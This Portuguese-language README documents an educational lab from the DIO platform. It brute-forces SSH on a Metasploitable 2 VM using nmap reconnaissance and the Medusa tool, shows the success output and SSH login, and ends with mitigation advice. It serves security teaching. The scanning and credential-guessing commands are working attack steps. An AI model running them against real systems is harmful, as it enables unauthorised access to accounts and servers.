# Lab de Brute Force: Kali Linux & Metasploitable 2
Repositorio apenas para documentar um desafio feito pela plataforma DIO sobre ataques utilizando metasploitables 2 e DWA 

Aviso Legal: Este laboratório foi desenvolvido estritamente para fins educacionais e de pesquisa em segurança da informação,os comandos a seguir não foram utilizados em nenhuma máquina real apenas em ambiente controlado.

 1. Objetivo do Laboratório
Demonstrar o funcionamento de um ataque de Força Bruta automatizado contra um serviço de rede (SSH) utilizando a ferramenta Medusa, evidenciando os riscos de credenciais fracas ou padrão e a importância de políticas de senhas fortes.

2. Arquitetura e Requisitos do Ambiente
Para montar este laboratório, foi necessário utilizar as seguintes ferramentas:
•	Máquina Atacante: Kali Linux
•	Máquina Alvo: Metasploitable 2 (Máquina virtual intencionalmente vulnerável)
•	Ferramenta Utilizada: Medusa (já inclusa por padrão no Kali Linux)

 3. Reconhecimento (Fase de Reconhecimento)
Antes de iniciar o ataque, precisamos identificar o endereço IP da máquina alvo na rede local e confirmar se o serviço SSH está ativo.
3.1. Identificando o IP do alvo
Para identificar o IP do alvo, execute o netdiscover ou nmap para encontrar o Metasploitable 2 na rede:

Bash
sudo nmap -sn 192.168.56.0/24
3.2. Escaneamento de Portas
Confirme se a porta do SSH (22) está aberta no alvo:
$ nmap -p 22 -sV 192.168.56.101
Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-29 22:00 EST
Nmap scan report for 192.168.56.101
Host is up (0.00045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds

 4. Executando o Brute Force com o Medusa
O Medusa é uma ferramenta de força bruta modular e rápida. No Metasploitable 2, as credenciais padrão conhecidas para o usuário administrador são msfadmin / msfadmin.

4.1. Preparando as Wordlists
Execute o seguinte comando no terminal do Kali Linux:
$ medusa -h 192.168.56.101 -u msfadmin -P /usr/share/wordlists/passwords.txt -M ssh -t 10

5. Detalhamento dos parâmetros:
•	-h: Especifica o endereço IP da máquina alvo.
•	-u: Define um nome de usuário específico a ser testado (msfadmin).
•	-P: Caminho para a wordlist de senhas (ex: rockyou.txt).
•	-M: Define o módulo/serviço a ser atacado (ssh).
•	-t: Define o número de threads paralelas (aumenta a velocidade do processo).

6. Resultado Esperado
Se o ataque for bem-sucedido, o Medusa exibirá as credenciais encontradas no terminal:
ACCOUNT FOUND: [ssh] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT KEPT OPEN: [ssh] Host: 192.168.56.101 User: msfadmin
Medusa finished at Thu Oct 29 22:02:15 2026

Summary of results:
  Target Success Count: 1
  Total Host/User/Password Combinations Tested: 14

7. Validação do acesso via SSH

$ ssh msfadmin@192.168.56.101
msfadmin@192.168.56.101's password: 

Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

msfadmin@metasploitable:~$ id
uid=1000(msfadmin) gid=1000(msfadmin) groups=1000(msfadmin),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),108(lpadmin),109(admin),115(sambashare)
msfadmin@metasploitable:~$ hostname
metasploitable

 8. Mitigação e Boas Práticas
Ataques de força bruta exploram a fragilidade humana e a falta de controles de acesso adequados. Para proteger sistemas contra esse tipo de ameaça, recomenda-se:
1.	Políticas de Senhas Fortes: Exigir senhas complexas (mínimo de 12 caracteres, incluindo letras maiúsculas, minúsculas, números e símbolos).
2.	Bloqueio de Conta (Account Lockout): Configurar políticas para bloquear contas após um número específico de tentativas consecutivas falhas.
3.	Autenticação de Dois Fatores (2FA): Implementar 2FA/MFA para impedir o acesso mesmo que a senha seja comprometida.
4.	Ferramentas de Proteção de Perímetro: Utilizar softwares como Fail2ban para banir automaticamente IPs que realizem muitas tentativas de login inválidas em um curto período.
5.	Alterar Portas Padrão: Embora seja apenas segurança por obscuridade, alterar a porta padrão do SSH (ex: de 22 para outra porta) reduz o volume de varreduras automatizadas de bots na internet.

